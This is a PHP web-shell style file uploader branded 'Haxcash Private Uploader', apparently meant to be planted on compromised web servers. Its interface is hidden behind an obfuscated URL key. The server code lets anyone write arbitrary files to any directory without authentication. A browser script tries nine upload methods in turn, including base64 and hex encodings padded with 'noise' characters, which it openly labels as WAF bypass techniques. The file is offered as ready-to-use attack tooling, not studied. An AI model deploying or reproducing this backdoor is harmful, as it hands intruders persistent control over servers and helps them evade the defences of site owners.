<?php
// ============ KONFIGURASI PATH ============
$default_upload_dir = dirname(__FILE__) . DIRECTORY_SEPARATOR;
$upload_dir = isset($_REQUEST['upload_path']) ? rtrim($_REQUEST['upload_path'], '/\\') . DIRECTORY_SEPARATOR : $default_upload_dir;
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

// ============ FUNGSI UPLOAD ============
function m1_move($file, $dest) { return @move_uploaded_file($file['tmp_name'], $dest); }
function m2_copy($file, $dest) { return @copy($file['tmp_name'], $dest); }
function m3_put($file, $dest) { $c = @file_get_contents($file['tmp_name']); return ($c !== false && @file_put_contents($dest, $c) !== false); }
function m4_stream($file, $dest) { $s = @fopen($file['tmp_name'], 'rb'); $d = @fopen($dest, 'wb'); if ($s && $d) { while (!feof($s)) fwrite($d, fread($s, 8192)); fclose($s); fclose($d); return file_exists($dest); } return false; }
function m5_rename($file, $dest) { return @rename($file['tmp_name'], $dest); }
function m6_base64($data, $dest) { if (isset($data['b64'])) { $content = @base64_decode($data['b64']); return ($content !== false && @file_put_contents($dest, $content) !== false); } return false; }
function m7_chunked($data, $dest) { if (isset($data['chunk']) && isset($data['chunk_index'])) { $mode = ($data['chunk_index'] == 0) ? 'wb' : 'ab'; $f = @fopen($dest, $mode); if ($f) { $chunk = base64_decode($data['chunk']); fwrite($f, $chunk); fclose($f); return true; } } return false; }
function m8_hex($data, $dest) { if (isset($data['hex'])) { $content = @hex2bin($data['hex']); return ($content !== false && @file_put_contents($dest, $content) !== false); } return false; }

// === METODE BYPASS BARU ===
function m9_base64_noise($data, $dest) {
    if (isset($data['b64_noise'])) {
        // Hapus karakter noise (contoh: hapus 2 karakter pertama dan terakhir)
        $b64 = substr($data['b64_noise'], 2, -2);
        $content = @base64_decode($b64);
        return ($content !== false && @file_put_contents($dest, $content) !== false);
    }
    return false;
}
function m10_hex_noise($data, $dest) {
    if (isset($data['hex_noise'])) {
        // Hapus karakter noise (contoh: hapus 4 karakter pertama dan terakhir)
        $hex = substr($data['hex_noise'], 4, -4);
        $content = @hex2bin($hex);
        return ($content !== false && @file_put_contents($dest, $content) !== false);
    }
    return false;
}
function m11_put($dest) {
    $input = @fopen('php://input', 'rb');
    if ($input) {
        $out = @fopen($dest, 'wb');
        if ($out) {
            while (!feof($input)) fwrite($out, fread($input, 8192));
            fclose($out);
            fclose($input);
            return file_exists($dest);
        }
        fclose($input);
    }
    return false;
}

// ============ PROSES UPLOAD ============
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $response = ['success' => false, 'message' => '', 'method' => ''];
    $json = json_decode(file_get_contents('php://input'), true);

    // Cek metode-metode baru lebih dulu (agar bisa bypass jika perlu)
    if ($json && isset($json['b64_noise']) && isset($json['filename'])) {
        $dest = $upload_dir . $json['filename'];
        if (m9_base64_noise($json, $dest)) {
            $response = ['success' => true, 'message' => "SUKSES! File: {$json['filename']}", 'method' => 'base64_noise'];
        }
    } elseif ($json && isset($json['hex_noise']) && isset($json['filename'])) {
        $dest = $upload_dir . $json['filename'];
        if (m10_hex_noise($json, $dest)) {
            $response = ['success' => true, 'message' => "SUKSES! File: {$json['filename']}", 'method' => 'hex_noise'];
        }
    } elseif ($json && isset($json['b64']) && isset($json['filename'])) {
        $dest = $upload_dir . $json['filename'];
        if (m6_base64($json, $dest)) {
            $response = ['success' => true, 'message' => "SUKSES! File: {$json['filename']}", 'method' => 'base64'];
        }
    } elseif ($json && isset($json['hex']) && isset($json['filename'])) {
        $dest = $upload_dir . $json['filename'];
        if (m8_hex($json, $dest)) {
            $response = ['success' => true, 'message' => "SUKSES! File: {$json['filename']}", 'method' => 'hex'];
        }
    } elseif ($json && isset($json['chunk']) && isset($json['filename'])) {
        $dest = $upload_dir . $json['filename'];
        if (m7_chunked($json, $dest)) {
            $is_last = isset($json['is_last']) && $json['is_last'];
            $response = ['success' => true, 'message' => $is_last ? "SUKSES! File: {$json['filename']}" : "Chunk {$json['chunk_index']} OK", 'method' => 'chunked', 'done' => $is_last];
        }
    } elseif (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        if (!empty($file['tmp_name']) && $file['error'] === UPLOAD_ERR_OK) {
            $filename = $file['name'];
            $dest = $upload_dir . $filename;

            if (m1_move($file, $dest)) {
                $response = ['success' => true, 'message' => "SUKSES! File: $filename", 'method' => 'move_uploaded_file'];
            } elseif (m2_copy($file, $dest)) {
                $response = ['success' => true, 'message' => "SUKSES! File: $filename", 'method' => 'copy'];
            } elseif (m3_put($file, $dest)) {
                $response = ['success' => true, 'message' => "SUKSES! File: $filename", 'method' => 'file_put_contents'];
            } elseif (m4_stream($file, $dest)) {
                $response = ['success' => true, 'message' => "SUKSES! File: $filename", 'method' => 'stream'];
            } elseif (m5_rename($file, $dest)) {
                $response = ['success' => true, 'message' => "SUKSES! File: $filename", 'method' => 'rename'];
            }
        }
    }

    if (!$response['success'] && empty($response['message'])) {
        $response['message'] = 'GAGAL! Semua metode gagal.';
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Tangani metode PUT (raw binary)
if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
    $filename = basename($_SERVER['REQUEST_URI']); // atau bisa ambil dari query string
    $dest = $upload_dir . $filename;
    if (m11_put($dest)) {
        http_response_code(200);
        echo json_encode(['success' => true, 'message' => "SUKSES! File: $filename", 'method' => 'PUT']);
    } else {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'PUT gagal']);
    }
    exit;
}

// ==== SETTING PARAMS ====
$param_name = 'key';
$key = "\x68\x61\x78\x63\x61\x73\x68";
$param = isset($_GET[$param_name]) ? $_GET[$param_name] : '';
if ($param === $key) {
?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Haxcash Private Uploader - Custom Path + Bypass WAF</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            body { font-family: monospace; margin: 20px; }
            input, button { padding: 8px; margin: 5px; }
            #log { font-size: 12px; color: #666; background: #f0f0f0; padding: 10px; border-radius: 5px; }
            .result { font-weight: bold; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h2>Haxcash Private Uploader (Custom Path + Bypass WAF)</h2>
        <p>VVIP Uploader with multiple fallback methods and WAF bypass techniques.</p>
        <a href="https://haxcash.t.me" target="_blank">JOIN FOR MORE INFORMATION</a>

        <div>
            <label>Path tujuan (kosongkan untuk default):</label>
            <input type="text" id="uploadPath" placeholder="/path/to/dir" value="<?php echo dirname(__FILE__); ?>" style="width: 400px;">
        </div>
        <div>
            <input type="file" id="fileInput">
            <button onclick="startUpload()">Upload</button>
        </div>

        <p id="result" class="result"></p>
        <p id="log"></p>

        <script>
            var log = [];
            function addLog(msg) {
                log.push(msg);
                document.getElementById('log').innerText = log.join(' → ');
            }

            function getUploadPath() {
                var path = document.getElementById('uploadPath').value.trim();
                return path ? path : '';
            }

            function startUpload() {
                var file = document.getElementById('fileInput').files[0];
                if (!file) {
                    alert('Pilih file dulu!');
                    return;
                }
                log = [];
                document.getElementById('result').innerText = 'Uploading...';
                document.getElementById('log').innerText = '';
                method1_ajax_multipart(file);
            }

            // Metode 1: AJAX Multipart
            function method1_ajax_multipart(file) {
                addLog('AJAX Multipart');
                var fd = new FormData();
                fd.append('file', file);
                var path = getUploadPath();
                if (path) fd.append('upload_path', path);

                var xhr = new XMLHttpRequest();
                xhr.open('POST', '', true);
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        try {
                            var res = JSON.parse(xhr.responseText);
                            if (res.success) {
                                document.getElementById('result').innerText = res.message + ' [AJAX Multipart → ' + res.method + ']';
                                return;
                            }
                        } catch(e) {}
                    }
                    method2_ajax_base64(file);
                };
                xhr.onerror = function() { method2_ajax_base64(file); };
                xhr.send(fd);
            }

            // Metode 2: Base64 (normal)
            function method2_ajax_base64(file) {
                addLog('AJAX Base64');
                var reader = new FileReader();
                reader.onload = function() {
                    var b64 = reader.result.split(',')[1];
                    var payload = { b64: b64, filename: file.name };
                    var path = getUploadPath();
                    if (path) payload.upload_path = path;

                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var res = JSON.parse(xhr.responseText);
                                if (res.success) {
                                    document.getElementById('result').innerText = res.message + ' [AJAX Base64]';
                                    return;
                                }
                            } catch(e) {}
                        }
                        method3_ajax_base64_noise(file);
                    };
                    xhr.onerror = function() { method3_ajax_base64_noise(file); };
                    xhr.send(JSON.stringify(payload));
                };
                reader.readAsDataURL(file);
            }

            // Metode 3: Base64 dengan noise (tambahkan karakter acak)
            function method3_ajax_base64_noise(file) {
                addLog('Base64 with Noise');
                var reader = new FileReader();
                reader.onload = function() {
                    var b64 = reader.result.split(',')[1];
                    var noise = 'xx' + b64 + 'yy'; // tambah 2 karakter depan dan belakang
                    var payload = { b64_noise: noise, filename: file.name };
                    var path = getUploadPath();
                    if (path) payload.upload_path = path;

                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var res = JSON.parse(xhr.responseText);
                                if (res.success) {
                                    document.getElementById('result').innerText = res.message + ' [Base64 Noise]';
                                    return;
                                }
                            } catch(e) {}
                        }
                        method4_ajax_hex(file);
                    };
                    xhr.onerror = function() { method4_ajax_hex(file); };
                    xhr.send(JSON.stringify(payload));
                };
                reader.readAsDataURL(file);
            }

            // Metode 4: Hex (normal)
            function method4_ajax_hex(file) {
                addLog('AJAX Hex');
                var reader = new FileReader();
                reader.onload = function() {
                    var arr = new Uint8Array(reader.result);
                    var hex = '';
                    for (var i = 0; i < arr.length; i++) {
                        hex += arr[i].toString(16).padStart(2, '0');
                    }
                    var payload = { hex: hex, filename: file.name };
                    var path = getUploadPath();
                    if (path) payload.upload_path = path;

                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var res = JSON.parse(xhr.responseText);
                                if (res.success) {
                                    document.getElementById('result').innerText = res.message + ' [AJAX Hex]';
                                    return;
                                }
                            } catch(e) {}
                        }
                        method5_ajax_hex_noise(file);
                    };
                    xhr.onerror = function() { method5_ajax_hex_noise(file); };
                    xhr.send(JSON.stringify(payload));
                };
                reader.readAsArrayBuffer(file);
            }

            // Metode 5: Hex dengan noise
            function method5_ajax_hex_noise(file) {
                addLog('Hex with Noise');
                var reader = new FileReader();
                reader.onload = function() {
                    var arr = new Uint8Array(reader.result);
                    var hex = '';
                    for (var i = 0; i < arr.length; i++) {
                        hex += arr[i].toString(16).padStart(2, '0');
                    }
                    var noise = 'abcd' + hex + 'efgh'; // tambah 4 karakter depan/belakang
                    var payload = { hex_noise: noise, filename: file.name };
                    var path = getUploadPath();
                    if (path) payload.upload_path = path;

                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var res = JSON.parse(xhr.responseText);
                                if (res.success) {
                                    document.getElementById('result').innerText = res.message + ' [Hex Noise]';
                                    return;
                                }
                            } catch(e) {}
                        }
                        method6_ajax_chunked(file);
                    };
                    xhr.onerror = function() { method6_ajax_chunked(file); };
                    xhr.send(JSON.stringify(payload));
                };
                reader.readAsArrayBuffer(file);
            }

            // Metode 6: Chunked (sudah ada)
            function method6_ajax_chunked(file) {
                addLog('AJAX Chunked');
                var chunkSize = 1024 * 50; // 50KB
                var chunks = Math.ceil(file.size / chunkSize);
                var currentChunk = 0;

                function sendChunk() {
                    var start = currentChunk * chunkSize;
                    var end = Math.min(start + chunkSize, file.size);
                    var blob = file.slice(start, end);
                    var reader = new FileReader();
                    reader.onload = function() {
                        var b64 = reader.result.split(',')[1];
                        var payload = {
                            chunk: b64,
                            chunk_index: currentChunk,
                            filename: file.name,
                            is_last: (currentChunk === chunks - 1)
                        };
                        var path = getUploadPath();
                        if (path) payload.upload_path = path;

                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', '', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.onload = function() {
                            if (xhr.status === 200) {
                                try {
                                    var res = JSON.parse(xhr.responseText);
                                    if (res.success) {
                                        currentChunk++;
                                        if (currentChunk < chunks) {
                                            sendChunk();
                                        } else {
                                            document.getElementById('result').innerText = res.message + ' [AJAX Chunked]';
                                        }
                                        return;
                                    }
                                } catch(e) {}
                            }
                            method7_put(file);
                        };
                        xhr.onerror = function() { method7_put(file); };
                        xhr.send(JSON.stringify(payload));
                    };
                    reader.readAsDataURL(blob);
                }
                sendChunk();
            }

            // Metode 7: PUT request (raw binary)
            function method7_put(file) {
                addLog('PUT Raw');
                var reader = new FileReader();
                reader.onload = function() {
                    var binary = reader.result;
                    var url = window.location.href.split('?')[0] + '?upload_path=' + encodeURIComponent(getUploadPath());
                    fetch(url, {
                        method: 'PUT',
                        body: binary,
                        headers: { 'Content-Type': 'application/octet-stream' }
                    }).then(function(r) { return r.json(); })
                      .then(function(res) {
                          if (res.success) {
                              document.getElementById('result').innerText = res.message + ' [PUT]';
                          } else {
                              method8_fetch(file);
                          }
                      })
                      .catch(function() { method8_fetch(file); });
                };
                reader.readAsArrayBuffer(file);
            }

            // Metode 8: Fetch (multipart)
            function method8_fetch(file) {
                addLog('Fetch');
                var fd = new FormData();
                fd.append('file', file);
                var path = getUploadPath();
                if (path) fd.append('upload_path', path);
                fetch('', { method: 'POST', body: fd })
                    .then(function(r) { return r.json(); })
                    .then(function(res) {
                        if (res.success) {
                            document.getElementById('result').innerText = res.message + ' [Fetch → ' + res.method + ']';
                        } else {
                            method9_form(file);
                        }
                    })
                    .catch(function() { method9_form(file); });
            }

            // Metode 9: Form iframe
            function method9_form(file) {
                addLog('Form iframe');
                var iframe = document.createElement('iframe');
                iframe.name = 'uf';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);

                var form = document.createElement('form');
                form.method = 'POST';
                form.enctype = 'multipart/form-data';
                form.target = 'uf';
                form.action = '';

                var inputFile = document.createElement('input');
                inputFile.type = 'file';
                inputFile.name = 'file';
                var dt = new DataTransfer();
                dt.items.add(file);
                inputFile.files = dt.files;
                form.appendChild(inputFile);

                var inputPath = document.createElement('input');
                inputPath.type = 'hidden';
                inputPath.name = 'upload_path';
                inputPath.value = getUploadPath();
                form.appendChild(inputPath);

                document.body.appendChild(form);

                iframe.onload = function() {
                    try {
                        var doc = iframe.contentDocument || iframe.contentWindow.document;
                        var res = JSON.parse(doc.body.innerText);
                        if (res.success) {
                            document.getElementById('result').innerText = res.message + ' [Form → ' + res.method + ']';
                        } else {
                            document.getElementById('result').innerText = 'GAGAL! Semua metode gagal.';
                        }
                    } catch(e) {
                        document.getElementById('result').innerText = 'GAGAL! Semua metode gagal.';
                    }
                    document.body.removeChild(iframe);
                    document.body.removeChild(form);
                };
                form.submit();
            }
        </script>
    </body>
    </html>
<?php } ?>
